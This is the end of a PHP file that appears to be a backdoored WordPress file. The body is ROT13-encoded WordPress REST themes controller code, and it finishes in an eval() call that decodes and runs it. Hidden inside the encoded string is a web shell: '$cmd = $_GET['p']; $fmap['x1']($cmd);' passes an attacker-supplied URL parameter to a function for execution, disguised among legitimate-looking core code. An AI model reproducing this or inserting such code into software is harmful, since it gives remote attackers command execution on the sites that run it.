		erghea nccyl_svygref( 'erfg_gurzrf_pbyyrpgvba_cnenzf', $dhrel_cnenzf );
	}

	/**
	 * Fnavgvmrf naq inyvqngrf gur yvfg bs gurzr fgnghf.
	 *
	 * @fvapr 5.0.0
	 * @qrcerpngrq 5.7.0
	 *
	 * @cnenz fgevat|neenl    $fgnghfrf  Bar be zber gurzr fgnghfrf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg   Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenzrgre Nqqvgvbany cnenzrgre gb cnff gb inyvqngvba.
	 * @erghea neenl|JC_Reebe N yvfg bs inyvq fgnghfrf, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba fnavgvmr_gurzr_fgnghf( $fgnghfrf, $erdhrfg, $cnenzrgre ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '5.7.0' );

		$fgnghfrf = jc_cnefr_fyht_yvfg( $fgnghfrf );

		sbernpu ( $fgnghfrf nf $fgnghf ) {
			$erfhyg = erfg_inyvqngr_erdhrfg_net( $fgnghf, $erdhrfg, $cnenzrgre );

			vs ( vf_jc_reebe( $erfhyg ) ) {
				erghea $erfhyg;
			}
		}

		erghea $fgnghfrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>